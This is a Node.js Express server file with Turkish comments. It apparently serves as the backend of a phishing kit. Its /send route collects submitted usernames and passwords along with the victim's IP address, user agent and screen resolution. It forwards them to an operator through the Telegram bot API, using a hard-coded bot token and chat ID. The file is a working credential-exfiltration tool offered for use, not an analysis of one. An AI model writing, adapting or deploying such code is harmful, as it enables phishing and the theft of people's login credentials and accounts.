const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const requestIp = require("request-ip");
const cors = require("cors"); // EKLENDİ

const app = express();
const PORT = 3000;

// Telegram bot bilgileri
const TELEGRAM_TOKEN = "7883112098:AAE56rI3QkScOISR8BiTEjhhY185GVHrR9g";
const CHAT_ID = "7425493729";

// CORS ve diğer middleware'ler
app.use(cors());
app.use(bodyParser.json());
app.use(requestIp.mw()); // IP middleware

app.post("/send", async (req, res) => {
  const { username, password, userAgent, screenResolution } = req.body;
  const ip = req.clientIp;

  const message = `
🔐 New Login Attempt:
👤 Username: ${username}
🔑 Password: ${password}
📶 IP Address: ${ip}
🖥️ User-Agent: ${userAgent}
🖥️ Screen Resolution: ${screenResolution}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
    });

    res.sendStatus(200);
  } catch (err) {
    console.error("Telegram error:", err);
    res.sendStatus(500);
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});
